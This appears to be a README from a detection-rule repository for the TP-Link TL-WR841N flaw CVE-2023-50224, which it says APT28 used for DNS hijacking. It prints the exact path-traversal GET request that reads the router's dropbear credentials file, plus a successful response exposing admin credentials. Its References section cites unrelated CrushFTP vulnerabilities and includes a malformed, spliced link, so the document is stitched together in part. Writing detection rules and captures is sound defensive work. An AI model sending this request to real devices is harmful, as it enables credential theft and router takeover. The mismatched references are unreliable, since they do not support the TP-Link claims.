This folder contains the PacketSmith [Yara-X detection rule](https://github.com/Netomize/RFiles/blob/main/cve_2023_50224/tp_link_wr841n_cve_2023_50224.yar) and a [pcap](https://github.com/Netomize/RFiles/blob/main/cve_2023_50224/tp_link_wr841n_cve_2023_50224_get_request.pcap) for the CVE-2023-50224 vulnerability in the TP-Link TL-WR841N devices.

This vulnerability was used by the APT28 - a GRU threat actor to compromise TP-Link TL-WR841N devices and perform malicious DNS hijacking operations.

A specially crafted GET request is sent to the vulnerable device over port 80, for the purpose of disclosing login credentials stored in the file `/tmp/dropbear/dropbearpwd`. The PoC was made public by [Swings](https://bestwing.me/tp-link-wr841n-router-cve-analysis.html).

To exploit the vulnerability, a request similar to the following is sent to the vulnerable device:

```
GET /loginFs/./dropbear/dropbearpwd HTTP/1.1
Host: 192.168.60.129
User-Agent: Mozilla/5.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Referer: http://192.168.60.129:80/
```

In case exploitation is successful, the server responds with:

```
HTTP/1.1 200 OK
Server: Router Webserver
Connection: Keep-Alive
Keep-Alive:
Persist:
WWW-Authenticate: Basic realm="TP-LINK Wireless N Router WR841N"
Content-Length: 56
Content-Type: text/plain

username:admin
password:21232f297a57a5a743894a0e4a801fc
```

**References**:

1. [CrushFTP auth bypass vulnerability: Disclosure mess leads to attacks](https://outpost24.com/blog/crushftp-auth-bypass-vulnerability/)
2. [Critical CrushFTP Authentication Bypass (CVE-2025-31161) Exposes Servers to Remote Attacks]([https://www.ncsc.gov.uk/news/apt28-exploit-routers-to-enable-dns-hijacking-operations](https://www.sonicwall.com/blog/critical-crushftp-authentication-bypass-cve-2025-2825-exposes-servers-to-remote-attacks))
3. [CVE-2025-2825](https://attackerkb.com/topics/k0EgiL9Psz/cve-2025-2825/rapid7-analysis)
4. [CrushFTP CVE-2025-31161 Auth Bypass and Post-Exploitation](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation)
5. [CVE-2025-31161 PoC](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)
